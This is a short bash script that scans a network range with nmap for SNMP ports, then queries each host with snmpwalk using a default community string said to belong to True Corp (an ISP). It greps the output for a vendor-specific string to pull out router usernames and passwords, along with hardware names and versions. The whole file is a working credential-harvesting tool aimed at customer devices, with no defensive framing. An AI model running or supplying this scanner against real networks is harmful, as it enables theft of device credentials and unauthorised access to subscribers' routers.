#!/bin/bash

# This script scans all addresses in the input network,
# then grep for username and password. 
# This script relies on 'nmap' and 'snmpwalk' program, and super-user priviledge for nmap.
#
# author Anidear
#

if [ $# -lt 1 ]; then
	echo "Usage: snmpscan ipaddress/netmask [community_string] [grep_string]"
	echo "Ex. snmpscan 192.168.1.0/24"
	echo "Ex. snmpscan 192.168.1.0/24 ADSL"
	echo "Ex. snmpscan 192.168.1.0/24 ADSL truehisp"
	exit 1
else
	iprange=$1
fi

if [ $# -ge 2 ]; then
	community_string=$2
else
	# default community string of True Corp is ADSL
	community_string='ADSL' 
fi

if [ $# -ge 3 ]; then
	grep_string=$2
else
	# default grep string for True Corp's password is truehisp
	grep_string='truehisp'
fi

echo "Scanning $iprange and saving result IP address to /tmp/snmpscanIP"
nmap -sS -p 161,162,10161,10162 $iprange | grep 'for' | sed  's/\(^.*(\)\|)//g' > /tmp/snmpscanIP
echo "scan completed."

echo "clean file /tmp/snmpscanout"
>/tmp/snmpscanout

echo "start enumerating all IP"
for ip in $(cat /tmp/snmpscanIP); do
	echo "[+] snmpwalk on $ip" 

	snmpfile="/tmp/snmpscan$ip"
	snmpwalk -c $community_string -v 1 $ip > $snmpfile
	if [ -s $snmpfile ]; then 
		echo "[*] scan is done. Result is stored in /tmp/snmpscan$ip"

		# show grep result
		data=$( grep -A 1 $grep_string $snmpfile | cut -d' ' -f4- )
		username=$( echo $data|cut -d' ' -f1 )
		password=$( echo $data|cut -d' ' -f2 )

		# show hw name
		hwname=$( grep 'iso.3.6.1.2.1.1.5.0' $snmpfile | cut -d' ' -f4- )

		# show hw version
		hwversion=$( grep 'iso.3.6.1.2.1.1.1.0' $snmpfile | cut -d' ' -f4- )

		echo -e "$ip\t$username\t$password\t$hwname\t$hwversion" >> /tmp/snmpscanout
	else
		# if no result from the IP
		echo "[-] no result from $ip"
	fi

done

echo "finish."

echo '-----------------------------'
cat /tmp/snmpscanout
echo '-----------------------------'
echo "output is also stored at /tmp/snmpscanout."
